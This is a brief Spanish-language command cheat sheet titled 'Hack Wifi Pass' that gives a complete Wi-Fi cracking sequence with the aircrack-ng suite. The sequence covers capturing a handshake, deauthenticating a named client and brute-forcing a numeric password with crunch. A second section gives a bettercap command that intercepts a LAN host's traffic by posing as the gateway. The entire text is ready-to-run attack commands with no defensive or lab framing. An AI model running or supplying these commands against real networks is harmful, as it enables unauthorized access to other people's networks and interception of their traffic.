# Comandos

	Hack Wifi Pass
	% = numeros
	@ = letras

	$ airmon-ng start wlano
	$ airodump-ng wlan0mon 
	$ airodump-ng -c 1 -w NomRed --bssid E0:41:36:36:F5:F8 wlan0mon (Escuchando)
	$ aireplay-ng -0 50 -a E0:41:36:36:F5:F8 -c CC:61:E5:09:A6:25  wlan0mon  (Desautenticar)
	$ crunch  10 10 -t %%%%%%%%%% 1234567890 | aircrack-ng -w - NomRed.cap -e NomRed
	

	#Capturar Trafico
	$ bettercap -X -T 192.168.1.61 --gateway 192.168.1.254 -O CapturaPrueba.txt



